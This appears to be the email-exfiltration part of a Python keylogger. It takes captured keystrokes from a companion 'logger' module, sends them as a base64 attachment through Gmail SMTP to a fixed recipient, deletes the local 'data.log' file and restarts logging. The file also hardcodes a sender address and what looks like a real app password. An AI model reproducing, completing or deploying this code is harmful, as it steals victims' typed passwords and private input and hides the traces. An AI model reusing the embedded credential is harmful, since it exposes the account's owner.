import smtplib
from os import *
import logger
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


def send_email():
    # Setting up MIME
    message = MIMEMultipart()
    message['From'] = 'RmanHeydari2000@gmail.com'
    message['To'] = 'armanalaki@gmail.com'
    password = 'wcixwkrbelolnsle'
    message['Subject'] = 'Keys from Arman'
    # Setting up message
    message.attach(MIMEText(f'{message["Subject"]} are located in this file: ', 'plain'))
    payload = MIMEBase('application', 'octate-stream')
    payload.set_payload(logger.get_keys_rb())
    encoders.encode_base64(payload)
    payload.add_header('Content-Disposition', 'attachment', filename='data.log')
    message.attach(payload)
    # Send email
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login(message['From'], password)
    remove('data.log')
    msg = message.as_string()
    server.sendmail(message['From'], message['To'], msg)
    server.quit()
    print('\nemail sent!\n')
    logger.main()
